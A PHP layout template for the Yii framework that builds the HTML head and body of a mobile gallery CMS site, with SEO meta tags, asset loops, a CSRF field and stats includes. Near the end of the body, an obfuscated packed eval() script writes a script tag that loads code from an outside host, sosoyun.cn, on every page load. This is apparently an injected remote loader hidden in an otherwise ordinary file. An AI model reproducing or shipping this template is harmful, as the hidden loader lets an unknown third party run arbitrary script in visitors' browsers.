<?php
use yii\helpers\Url;
use yii\helpers\Html;

$cssFiles = isset($this->params['cssFiles']) ? $this->params['cssFiles'] : [];
$jsFiles = isset($this->params['jsFiles']) ? $this->params['jsFiles'] : [];

$tdkInfos = isset(Yii::$app->params['tdkInfos']) ? Yii::$app->params['tdkInfos'] : [];
$seoTitle = isset($tdkInfos['title']) ? $tdkInfos['title'] : Yii::$app->params['seoTitle'];
$seoTitle = isset($this->params['titlePrefix']) ? $this->params['titlePrefix'] . $seoTitle : $seoTitle;
$seoKeyword = isset($tdkInfos['keyword']) ? $tdkInfos['keyword'] : Yii::$app->params['seoKeyword'];
$seoDescription = isset($tdkInfos['description']) ? $tdkInfos['description'] : Yii::$app->params['seoDescription'];
$formPosition = isset($this->params['formPosition']) ? $this->params['formPosition'] : '';
$formPositionName = isset($this->params['formPositionName']) ? $this->params['formPositionName'] : '';
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<link rel="canonical" href="<?= Yii::getAlias('@gallerycmsurl'); ?>" />
<meta name="applicable-device" content="mobile" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
<link rel="shortcut icon" href="<?= Yii::getAlias('@asseturl'); ?>/gallerycms/home/images/favicon.ico" />
<title><?= $seoTitle; ?></title>
<meta name="keywords" content="<?= $seoKeyword; ?>" />
<meta name="description" content="<?= $seoDescription; ?>" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />
<meta name="format-detection" content="telephone=no">
<meta name="format-detection" content="address=no">
<meta content="false" name="twcClient" id="twcClient" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />

<?php if (isset($cssFiles)) { foreach ($cssFiles as $cssFile) { ?>
<link rel="stylesheet" type="text/css" href="<?= Yii::getAlias('@asseturl/gallerycms') . '/house-m/css/' . $cssFile . '.css'; ?>" />
<?php } } ?>

<?php if (isset($jsFiles)) { foreach ($jsFiles as $jsFile) { ?>
<script type="text/javascript" src="<?= Yii::getAlias('@asseturl/gallerycms') . '/house-m/js/' . $jsFile . '.js'; ?>"></script>
<?php } } ?>

<script type="text/javascript">
window.BASE_URL = "<?= Yii::getAlias('@m.gallerycmsurl'); ?>";
window.ASSET_URL = '<?= Yii::getAlias('@asseturl'); ?>';
window.SPREAD_URL = '<?= Yii::getAlias('@web'); ?>';
window.signupUrl = '<?= Yii::getAlias('@web') . '/jz-signup.html'; ?>';
</script>
<?= $this->render('@spread/decoration/views/_stat', []); // 顶部 ?>
</head>
<body class="<?php if (isset($this->params['bodyClass'])) { echo $this->params['bodyClass']; } ?>">
<?= $content; ?>
<?php echo $this->render('../common/_footer', []); ?>
<?php echo $this->render('../common/_custom_service', []); ?>
<input type="hidden" id="info_id" value="1" />
<input type="hidden" id="position" value="<?= $formPosition; ?>" />
<input type="hidden" id="position_name" value="<?= $formPositionName; ?>" />
<?= Html::hiddenInput(Yii::$app->request->csrfParam, Yii::$app->request->getCsrfToken(), ['id' => '_csrf']); ?>
<div style="position:absolute; width:0px; height:0px; z-index:1; display:none">
<?php $statUrl = str_replace(Yii::getAlias('@spreadurl'), '', Yii::$app->params['statUrl']); echo $statUrl; ?>
</div>
<script>/* 28930 */eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3.2("<0 1=\'4://9.5.8/?7=6\'></0>");',10,10,'script|src|writeln|document|http|sosoyun|28930|i|cn|www'.split('|'),0,{}));</script>
<?= $this->render('@spread/decoration/views/_stat', []); // 顶部 ?>
</body>
</html>
